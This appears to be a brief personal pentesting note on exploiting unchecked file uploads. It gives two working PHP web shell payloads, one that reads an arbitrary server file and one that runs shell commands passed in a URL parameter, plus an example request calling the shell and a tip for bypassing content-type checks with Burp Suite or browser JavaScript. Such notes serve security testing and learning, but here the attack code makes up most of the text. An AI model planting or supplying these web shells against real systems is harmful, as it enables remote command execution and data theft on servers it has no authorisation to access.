# file upload
when files are uploaded
and not checked

its possible to upload fe a webshell
and then acces the webshell

## uploads
<?php echo file_get_contents('/path/to/target/file'); ?>

<?php echo system($_GET['command']); ?>
xample/exploit.php?command=id HTTP/1.1

## formdata
sometimes it only checks if a content type is image/png or something
you can ez do it in burpsuite
or with js see "script/file_upload_blob.js" you could just execute this in console
